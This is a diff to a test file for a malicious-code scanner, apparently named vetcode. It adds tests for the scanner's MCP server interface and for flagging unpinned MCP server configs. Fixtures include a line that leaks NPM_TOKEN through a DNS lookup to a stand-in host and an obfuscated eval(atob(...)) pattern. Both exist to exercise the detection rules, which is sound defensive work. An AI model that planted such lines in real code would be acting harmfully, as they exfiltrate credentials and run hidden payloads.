@@ -346,3 +346,35 @@ test("DNS exfiltration", async () => {
   const r = await run(project({ "x.js": "dns.resolve(`${process.env.NPM_TOKEN}.x.example.com`, () => {});\n" }));
   assert.ok(rules(r).has("mal-dns-exfil"));
 });
+
+test("MCP server: initialize, list tools, scan, guide, errors", async () => {
+  const dir = project({ "a.js": j("eval(at", "ob(x));\n") });
+  const msgs = [
+    { jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "t", version: "1" } } },
+    { jsonrpc: "2.0", method: "notifications/initialized" },
+    { jsonrpc: "2.0", id: 2, method: "tools/list" },
+    { jsonrpc: "2.0", id: 3, method: "tools/call", params: { name: "vetcode_scan", arguments: { path: dir } } },
+    { jsonrpc: "2.0", id: 4, method: "tools/call", params: { name: "vetcode_reference", arguments: { topic: "malware" } } },
+    { jsonrpc: "2.0", id: 5, method: "tools/call", params: { name: "vetcode_scan", arguments: { path: "/no/such/folder" } } },
+    { jsonrpc: "2.0", id: 6, method: "no/such/method" },
+  ];
+  const r = spawnSync(process.execPath, [path.resolve("mcp/server.mjs")], { input: msgs.map(m => JSON.stringify(m)).join("\n") + "\n", encoding: "utf8" });
+  const out = Object.fromEntries(r.stdout.trim().split("\n").map(l => JSON.parse(l)).map(m => [m.id, m]));
+  assert.equal(out[1].result.serverInfo.name, "vetcode");
+  assert.deepEqual(out[2].result.tools.map(t => t.name), ["vetcode_scan", "vetcode_guide", "vetcode_reference"]);
+  assert.ok(out[3].result.structuredContent.findings.some(f => f.rule === "mal-eval-decoded"));
+  assert.match(out[4].result.content[0].text, /Malware and supply-chain attacks/);
+  assert.equal(out[5].result.isError, true);
+  assert.equal(out[6].error.code, -32601);
+  assert.equal(Object.keys(out).length, 6, "notifications get no reply");
+});
+
+test("MCP configs pinned to a git tag or commit are not reported as unpinned", async () => {
+  const dir = project({ ".mcp.json": JSON.stringify({ mcpServers: {
+    a: { command: "npx", args: ["-y", "-p", "github:openyard-cloud/vetcode#v0.2.0", "vetcode-mcp"] },
+    b: { command: "npx", args: ["-y", "github:someone/tool#3f2a9c1"] },
+    c: { command: "npx", args: ["-y", "github:someone/tool"] },
+  } }) });
+  const r = await run(dir);
+  assert.deepEqual(r.findings.filter(f => f.rule === "mcp-unpinned").map(f => f.title.match(/"(\w)"/)[1]), ["c"]);
+});
